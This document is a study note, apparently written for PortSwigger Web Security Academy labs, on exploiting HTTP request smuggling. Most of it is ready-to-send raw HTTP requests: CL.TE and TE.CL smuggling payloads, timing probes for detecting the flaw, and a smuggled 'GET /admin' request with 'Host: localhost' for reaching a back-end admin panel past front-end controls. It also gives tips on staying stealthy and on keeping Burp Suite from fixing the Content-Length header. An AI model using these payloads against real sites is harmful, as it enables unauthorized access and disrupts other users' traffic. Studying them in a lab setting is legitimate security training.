HTTP request smuggling is very challenging to exploit


There is two way for encode a request:
TE -> Transfer-Encoding: chunked 
CL -> Content-Lenght: 6

Example

## CL.TE vulnerabilities
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
## TE.CL vulnerabilities
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

### Remember to remove "Update Content-Lenght" option in BurpSuite, because this will ruine your exploit
Add also at the end of a chunked request \r\n\r\n


There are two main methods to find the vulnerabilities CL.TE and TE.CL causing a time delay

To make evidence of the first (CL.TE) try this:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
"Since the front-end server uses the Content-Length header, it will forward only part of this request, omitting the X. 
The back-end server uses the Transfer-Encoding header, processes the first chunk, and then waits for the next chunk to arrive. 
This will cause an observable time delay."

To make evidence of the other one (TE.CL)
```

POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
"Since the front-end server uses the Transfer-Encoding header, it will forward only part of this request, omitting the X. 
The back-end server uses the Content-Length header, expects more content in the message body, and waits for the remaining content to arrive. 
This will cause an observable time delay."

## IMPORTANT: 

* "The timing-based test for TE.CL vulnerabilities will potentially disrupt other application users if the application is vulnerable to the CL.TE variant of the vulnerability.* 
*So to be stealthy and minimize disruption, you should use the CL.TE test first and continue to the TE.CL test only if the first test is unsuccessful."*



Sometimes you need to retrive the X-Forwarded header, but in some cases is custom, in that case 
you need to retrive with a POST request wich reflects the results of the research as the example below:

```
POST / HTTP/1.1
Host: 0a1e002d0400da07c09d3b88003e005e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0
```
```
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```


## You need to include the trailing sequence \r\n\r\n following the final 0.

```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```


First try, this will fail due to the two Host header in conflict
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
```

Second Try, will succeed because the second request will be embedded in the body of the smuggled request
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=


```
